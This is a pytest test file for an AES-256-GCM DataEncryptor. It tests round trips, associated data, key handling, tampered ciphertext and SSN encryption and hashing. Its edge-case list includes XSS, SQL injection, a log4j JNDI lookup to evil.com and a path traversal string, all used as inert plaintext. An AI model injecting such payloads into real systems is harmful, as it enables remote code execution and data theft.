"""Comprehensive tests for DataEncryptor (AES-256-GCM encryption).

Covers round-trip encrypt/decrypt, Unicode handling, associated data,
key management, corrupted ciphertext, nonce uniqueness, SSN encryption,
and hashing operations.
"""

import os
import sys
import base64
import secrets
from pathlib import Path
from decimal import Decimal

import pytest
from unittest.mock import Mock, MagicMock, patch

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from security.encryption import (
    DataEncryptor,
    EncryptionError,
    DecryptionError,
    get_encryptor,
    encrypt_sensitive_field,
    decrypt_sensitive_field,
    CRYPTO_AVAILABLE,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def master_key():
    """A deterministic master key for reproducible tests."""
    return "a" * 64  # 64 hex chars = 256-bit equivalent


@pytest.fixture
def encryptor(master_key):
    """DataEncryptor with a known master key."""
    return DataEncryptor(master_key=master_key)


@pytest.fixture
def alt_encryptor():
    """DataEncryptor with a different master key."""
    return DataEncryptor(master_key="b" * 64)


# ===========================================================================
# Round-trip: encrypt then decrypt should return original
# ===========================================================================

class TestRoundTripBasic:
    """Basic round-trip encrypt/decrypt for various plaintext inputs."""

    def test_empty_string(self, encryptor):
        ct = encryptor.encrypt("")
        assert encryptor.decrypt(ct) == ""

    def test_single_character(self, encryptor):
        ct = encryptor.encrypt("x")
        assert encryptor.decrypt(ct) == "x"

    def test_short_ascii(self, encryptor):
        pt = "hello world"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_alphanumeric(self, encryptor):
        pt = "abc123XYZ789"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_special_characters(self, encryptor):
        pt = "!@#$%^&*()_+-=[]{}|;':\",./<>?"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_whitespace_variants(self, encryptor):
        pt = " \t\n\r\f\v "
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_newlines(self, encryptor):
        pt = "line1\nline2\nline3"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_null_byte_in_string(self, encryptor):
        pt = "before\x00after"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_numeric_string(self, encryptor):
        pt = "1234567890"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_json_string(self, encryptor):
        pt = '{"key": "value", "num": 42}'
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt


class TestRoundTripUnicode:
    """Round-trip tests with Unicode content."""

    def test_chinese_characters(self, encryptor):
        pt = "你好世界"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_arabic_characters(self, encryptor):
        pt = "مرحبا بالعالم"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_japanese_characters(self, encryptor):
        pt = "こんにちは世界"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_korean_characters(self, encryptor):
        pt = "안녕하세요 세계"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_emoji(self, encryptor):
        pt = "Hello 🌍🎉🔐💰"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_mixed_unicode_ascii(self, encryptor):
        pt = "Tax: $1,234 — 日本語テスト — مرحبا"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_accented_latin(self, encryptor):
        pt = "résumé naïve café"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_cyrillic(self, encryptor):
        pt = "Привет мир"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_hindi_devanagari(self, encryptor):
        pt = "नमस्ते दुनिया"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_emoji_only(self, encryptor):
        pt = "🏠💲📊📝✅"
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt


class TestRoundTripLargeData:
    """Round-trip tests with larger payloads."""

    def test_1kb(self, encryptor):
        pt = "A" * 1024
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_10kb(self, encryptor):
        pt = "B" * (10 * 1024)
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_100kb(self, encryptor):
        pt = "C" * (100 * 1024)
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_1mb(self, encryptor):
        pt = "D" * (1024 * 1024)
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_random_bytes_as_string(self, encryptor):
        # Random printable ASCII
        pt = "".join(chr(i % 95 + 32) for i in range(5000))
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt

    def test_repeated_pattern(self, encryptor):
        pt = "ABCDEFGHIJ" * 10000
        assert encryptor.decrypt(encryptor.encrypt(pt)) == pt


class TestRoundTripBytesInput:
    """Round-trip when passing bytes directly to encrypt."""

    def test_bytes_input_empty(self, encryptor):
        ct = encryptor.encrypt(b"")
        assert encryptor.decrypt(ct) == ""

    def test_bytes_input_ascii(self, encryptor):
        ct = encryptor.encrypt(b"hello bytes")
        assert encryptor.decrypt(ct) == "hello bytes"

    def test_bytes_input_utf8(self, encryptor):
        pt_str = "日本語"
        ct = encryptor.encrypt(pt_str.encode("utf-8"))
        assert encryptor.decrypt(ct) == pt_str


# ===========================================================================
# Associated data (AAD)
# ===========================================================================

class TestAssociatedData:
    """Associated Authenticated Data scenarios."""

    def test_with_associated_data(self, encryptor):
        pt = "secret"
        aad = b"context-info"
        ct = encryptor.encrypt(pt, associated_data=aad)
        assert encryptor.decrypt(ct, associated_data=aad) == pt

    def test_without_associated_data(self, encryptor):
        pt = "secret"
        ct = encryptor.encrypt(pt)
        assert encryptor.decrypt(ct) == pt

    def test_wrong_associated_data_fails(self, encryptor):
        ct = encryptor.encrypt("secret", associated_data=b"correct")
        with pytest.raises(Exception):
            encryptor.decrypt(ct, associated_data=b"wrong")

    def test_missing_associated_data_on_decrypt_fails(self, encryptor):
        ct = encryptor.encrypt("secret", associated_data=b"must-match")
        with pytest.raises(Exception):
            encryptor.decrypt(ct)  # No AAD provided

    def test_extra_associated_data_on_decrypt_fails(self, encryptor):
        ct = encryptor.encrypt("secret")  # No AAD
        with pytest.raises(Exception):
            encryptor.decrypt(ct, associated_data=b"unexpected")

    def test_empty_associated_data(self, encryptor):
        pt = "data"
        ct = encryptor.encrypt(pt, associated_data=b"")
        assert encryptor.decrypt(ct, associated_data=b"") == pt

    def test_long_associated_data(self, encryptor):
        pt = "data"
        aad = b"x" * 10000
        ct = encryptor.encrypt(pt, associated_data=aad)
        assert encryptor.decrypt(ct, associated_data=aad) == pt

    def test_associated_data_is_not_in_ciphertext(self, encryptor):
        aad = b"visible-context-12345"
        ct = encryptor.encrypt("secret", associated_data=aad)
        raw = base64.b64decode(ct)
        assert b"visible-context-12345" not in raw


# ===========================================================================
# Key management
# ===========================================================================

class TestKeyManagement:
    """Master key handling and derivation."""

    def test_different_keys_produce_different_ciphertext(self, encryptor, alt_encryptor):
        pt = "same plaintext"
        ct1 = encryptor.encrypt(pt)
        ct2 = alt_encryptor.encrypt(pt)
        assert ct1 != ct2

    def test_wrong_key_cannot_decrypt(self, encryptor, alt_encryptor):
        ct = encryptor.encrypt("secret")
        with pytest.raises(Exception):
            alt_encryptor.decrypt(ct)

    def test_explicit_master_key(self):
        key = secrets.token_hex(32)
        enc = DataEncryptor(master_key=key)
        ct = enc.encrypt("test")
        assert enc.decrypt(ct) == "test"

    def test_env_var_master_key(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_MASTER_KEY", "env_key_" + "0" * 56)
        enc = DataEncryptor()
        ct = enc.encrypt("from_env")
        assert enc.decrypt(ct) == "from_env"

    def test_missing_key_non_production_uses_random(self, monkeypatch):
        monkeypatch.delenv("ENCRYPTION_MASTER_KEY", raising=False)
        monkeypatch.setenv("APP_ENVIRONMENT", "development")
        enc = DataEncryptor()
        # Should work (random key auto-generated)
        ct = enc.encrypt("auto_key")
        assert enc.decrypt(ct) == "auto_key"

    def test_missing_key_production_raises(self, monkeypatch):
        monkeypatch.delenv("ENCRYPTION_MASTER_KEY", raising=False)
        monkeypatch.setenv("APP_ENVIRONMENT", "production")
        with pytest.raises(ValueError, match="ENCRYPTION_MASTER_KEY"):
            DataEncryptor()

    def test_missing_key_test_env_uses_random(self, monkeypatch):
        monkeypatch.delenv("ENCRYPTION_MASTER_KEY", raising=False)
        monkeypatch.setenv("APP_ENVIRONMENT", "test")
        enc = DataEncryptor()
        ct = enc.encrypt("test_env")
        assert enc.decrypt(ct) == "test_env"

    def test_explicit_key_overrides_env(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_MASTER_KEY", "env_key")
        enc = DataEncryptor(master_key="explicit_key")
        assert enc._master_key == "explicit_key"


# ===========================================================================
# Nonce uniqueness
# ===========================================================================

class TestNonceUniqueness:
    """Each encryption must use a unique nonce."""

    def test_same_plaintext_different_ciphertext(self, encryptor):
        pt = "deterministic?"
        results = {encryptor.encrypt(pt) for _ in range(20)}
        assert len(results) == 20, "All ciphertexts should be unique"

    def test_same_plaintext_with_aad_different_ciphertext(self, encryptor):
        pt = "same"
        aad = b"same_aad"
        results = {encryptor.encrypt(pt, associated_data=aad) for _ in range(20)}
        assert len(results) == 20

    def test_nonce_size_is_12_bytes(self, encryptor):
        ct = encryptor.encrypt("test")
        raw = base64.b64decode(ct)
        # First 16 bytes are salt, next 12 bytes are nonce
        nonce = raw[16:28]
        assert len(nonce) == 12

    def test_salt_size_is_16_bytes(self, encryptor):
        ct = encryptor.encrypt("test")
        raw = base64.b64decode(ct)
        salt = raw[:16]
        assert len(salt) == 16


# ===========================================================================
# Corrupted ciphertext
# ===========================================================================

class TestCorruptedCiphertext:
    """Decryption must fail for tampered/corrupted data."""

    def test_truncated_ciphertext(self, encryptor):
        ct = encryptor.encrypt("sensitive")
        truncated = ct[:10]
        with pytest.raises(Exception):
            encryptor.decrypt(truncated)

    def test_modified_single_byte(self, encryptor):
        ct = encryptor.encrypt("sensitive")
        raw = bytearray(base64.b64decode(ct))
        raw[-1] ^= 0xFF  # Flip last byte
        modified = base64.b64encode(bytes(raw)).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(modified)

    def test_modified_salt_byte(self, encryptor):
        ct = encryptor.encrypt("data")
        raw = bytearray(base64.b64decode(ct))
        raw[0] ^= 0xFF  # Flip salt byte
        modified = base64.b64encode(bytes(raw)).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(modified)

    def test_modified_nonce_byte(self, encryptor):
        ct = encryptor.encrypt("data")
        raw = bytearray(base64.b64decode(ct))
        raw[16] ^= 0xFF  # Flip nonce byte (offset 16)
        modified = base64.b64encode(bytes(raw)).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(modified)

    def test_completely_random_data(self, encryptor):
        random_ct = base64.b64encode(secrets.token_bytes(64)).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(random_ct)

    def test_empty_ciphertext(self, encryptor):
        with pytest.raises(Exception):
            encryptor.decrypt("")

    def test_non_base64_ciphertext(self, encryptor):
        with pytest.raises(Exception):
            encryptor.decrypt("!!!not-base64!!!")

    def test_too_short_ciphertext(self, encryptor):
        short = base64.b64encode(b"short").decode()
        with pytest.raises(Exception):
            encryptor.decrypt(short)

    def test_appended_data(self, encryptor):
        ct = encryptor.encrypt("original")
        raw = base64.b64decode(ct) + b"extra"
        modified = base64.b64encode(raw).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(modified)

    def test_swapped_salt_nonce(self, encryptor):
        ct = encryptor.encrypt("data")
        raw = bytearray(base64.b64decode(ct))
        # Swap salt and nonce regions
        salt = bytes(raw[:16])
        nonce = bytes(raw[16:28])
        raw[:16] = nonce + b"\x00" * 4
        raw[16:28] = salt[:12]
        modified = base64.b64encode(bytes(raw)).decode()
        with pytest.raises(Exception):
            encryptor.decrypt(modified)


# ===========================================================================
# CRYPTO_AVAILABLE mock
# ===========================================================================

class TestCryptoAvailability:
    """Behavior when cryptography library is not installed."""

    def test_crypto_available_is_true(self):
        assert CRYPTO_AVAILABLE is True

    @patch("security.encryption.CRYPTO_AVAILABLE", False)
    def test_init_raises_when_crypto_unavailable(self):
        with pytest.raises(ImportError, match="cryptography library required"):
            DataEncryptor(master_key="test")


# ===========================================================================
# SSN encryption
# ===========================================================================

class TestSSNEncryption:
    """SSN-specific encrypt/decrypt methods."""

    def test_encrypt_decrypt_ssn_with_dashes(self, encryptor):
        ssn = "123-45-6789"
        encrypted = encryptor.encrypt_ssn(ssn)
        decrypted = encryptor.decrypt_ssn(encrypted)
        assert decrypted == "123-45-6789"

    def test_encrypt_decrypt_ssn_without_dashes(self, encryptor):
        encrypted = encryptor.encrypt_ssn("123456789")
        assert encryptor.decrypt_ssn(encrypted) == "123-45-6789"

    def test_decrypt_ssn_no_format(self, encryptor):
        encrypted = encryptor.encrypt_ssn("123456789")
        assert encryptor.decrypt_ssn(encrypted, format_output=False) == "123456789"

    def test_invalid_ssn_too_short(self, encryptor):
        with pytest.raises(ValueError, match="9 digits"):
            encryptor.encrypt_ssn("12345")

    def test_invalid_ssn_too_long(self, encryptor):
        with pytest.raises(ValueError, match="9 digits"):
            encryptor.encrypt_ssn("1234567890")

    def test_invalid_ssn_letters(self, encryptor):
        with pytest.raises(ValueError, match="9 digits"):
            encryptor.encrypt_ssn("12345abcd")

    def test_ssn_uses_associated_data(self, encryptor):
        """SSN encrypted with AAD='ssn', cannot decrypt without it."""
        encrypted = encryptor.encrypt_ssn("123456789")
        with pytest.raises(Exception):
            encryptor.decrypt(encrypted)  # Missing AAD

    def test_ssn_cross_decryptor_fails(self, encryptor, alt_encryptor):
        encrypted = encryptor.encrypt_ssn("123456789")
        with pytest.raises(Exception):
            alt_encryptor.decrypt_ssn(encrypted)

    @pytest.mark.parametrize("ssn", [
        "111-22-3333",
        "999-88-7777",
        "123-45-6789",
        "000-00-0001",
    ])
    def test_various_ssn_round_trip(self, encryptor, ssn):
        digits = "".join(c for c in ssn if c.isdigit())
        if len(digits) == 9:
            encrypted = encryptor.encrypt_ssn(ssn)
            decrypted_raw = encryptor.decrypt_ssn(encrypted, format_output=False)
            assert decrypted_raw == digits


# ===========================================================================
# SSN hashing
# ===========================================================================

class TestSSNHashing:
    """Test hash_ssn for lookup hashing."""

    def test_hash_ssn_returns_hex(self, encryptor):
        h = encryptor.hash_ssn("123-45-6789")
        assert isinstance(h, str)
        assert len(h) == 64  # SHA-256 hex digest

    def test_hash_ssn_deterministic(self, encryptor):
        h1 = encryptor.hash_ssn("123456789")
        h2 = encryptor.hash_ssn("123-45-6789")
        assert h1 == h2

    def test_hash_ssn_different_ssns_different_hashes(self, encryptor):
        h1 = encryptor.hash_ssn("123456789")
        h2 = encryptor.hash_ssn("987654321")
        assert h1 != h2

    def test_hash_ssn_with_custom_salt(self, encryptor):
        h1 = encryptor.hash_ssn("123456789", salt="salt1")
        h2 = encryptor.hash_ssn("123456789", salt="salt2")
        assert h1 != h2

    def test_hash_ssn_invalid_raises(self, encryptor):
        with pytest.raises(ValueError, match="9 digits"):
            encryptor.hash_ssn("12345")

    def test_hash_different_keys_different_hashes(self, encryptor, alt_encryptor):
        h1 = encryptor.hash_ssn("123456789")
        h2 = alt_encryptor.hash_ssn("123456789")
        assert h1 != h2


# ===========================================================================
# Singleton / convenience functions
# ===========================================================================

class TestSingleton:
    """Test module-level convenience functions."""

    def test_get_encryptor_returns_instance(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_MASTER_KEY", "test_key_singleton")
        # Reset singleton
        import security.encryption as mod
        mod._encryptor = None
        enc = get_encryptor()
        assert isinstance(enc, DataEncryptor)
        # Cleanup
        mod._encryptor = None

    def test_encrypt_decrypt_sensitive_field(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_MASTER_KEY", "test_key_for_field")
        import security.encryption as mod
        mod._encryptor = None
        ct = encrypt_sensitive_field("my_secret")
        assert decrypt_sensitive_field(ct) == "my_secret"
        mod._encryptor = None

    def test_get_encryptor_caches(self, monkeypatch):
        monkeypatch.setenv("ENCRYPTION_MASTER_KEY", "cache_test_key")
        import security.encryption as mod
        mod._encryptor = None
        enc1 = get_encryptor()
        enc2 = get_encryptor()
        assert enc1 is enc2
        mod._encryptor = None


# ===========================================================================
# Parametrized edge-case plaintext values
# ===========================================================================

EDGE_CASE_PLAINTEXTS = [
    pytest.param("", id="empty_string"),
    pytest.param(" ", id="single_space"),
    pytest.param("\t", id="tab"),
    pytest.param("\n", id="newline"),
    pytest.param("a", id="single_char"),
    pytest.param("a" * 255, id="255_chars"),
    pytest.param("a" * 256, id="256_chars"),
    pytest.param("a" * 65535, id="64k_chars"),
    pytest.param("<script>alert(1)</script>", id="html_tag"),
    pytest.param("'; DROP TABLE users; --", id="sql_injection"),
    pytest.param("${jndi:ldap://evil.com}", id="log4j"),
    pytest.param("../../../etc/passwd", id="path_traversal"),
    pytest.param("null", id="null_word"),
    pytest.param("undefined", id="undefined_word"),
    pytest.param("true", id="boolean_word"),
    pytest.param("0", id="zero"),
    pytest.param("-1", id="negative_one"),
    pytest.param("9" * 100, id="many_nines"),
    pytest.param("🔐" * 100, id="many_emoji"),
]


class TestParametrizedRoundTrip:
    """Parametrized round-trip tests for edge-case plaintexts."""

    @pytest.mark.parametrize("plaintext", EDGE_CASE_PLAINTEXTS)
    def test_round_trip(self, encryptor, plaintext):
        ct = encryptor.encrypt(plaintext)
        assert encryptor.decrypt(ct) == plaintext

    @pytest.mark.parametrize("plaintext", EDGE_CASE_PLAINTEXTS)
    def test_round_trip_with_aad(self, encryptor, plaintext):
        aad = b"test-context"
        ct = encryptor.encrypt(plaintext, associated_data=aad)
        assert encryptor.decrypt(ct, associated_data=aad) == plaintext


# ===========================================================================
# Output format validation
# ===========================================================================

class TestOutputFormat:
    """Validate the base64-encoded output format."""

    def test_output_is_base64(self, encryptor):
        ct = encryptor.encrypt("test")
        # Should decode without error
        raw = base64.b64decode(ct)
        assert len(raw) > 0

    def test_output_contains_salt_nonce_ciphertext(self, encryptor):
        ct = encryptor.encrypt("test")
        raw = base64.b64decode(ct)
        # salt(16) + nonce(12) + ciphertext(at least tag=16)
        assert len(raw) >= 16 + 12 + 16

    def test_output_is_utf8_string(self, encryptor):
        ct = encryptor.encrypt("test")
        assert isinstance(ct, str)
        ct.encode("utf-8")  # Should not raise

    def test_decrypt_returns_string(self, encryptor):
        ct = encryptor.encrypt("test")
        result = encryptor.decrypt(ct)
        assert isinstance(result, str)


# ===========================================================================
# Constants validation
# ===========================================================================

class TestConstants:
    """Verify cryptographic constants are correct."""

    def test_nonce_size(self):
        assert DataEncryptor.NONCE_SIZE == 12

    def test_salt_size(self):
        assert DataEncryptor.SALT_SIZE == 16

    def test_key_size(self):
        assert DataEncryptor.KEY_SIZE == 32

    def test_iterations(self):
        assert DataEncryptor.ITERATIONS == 100000
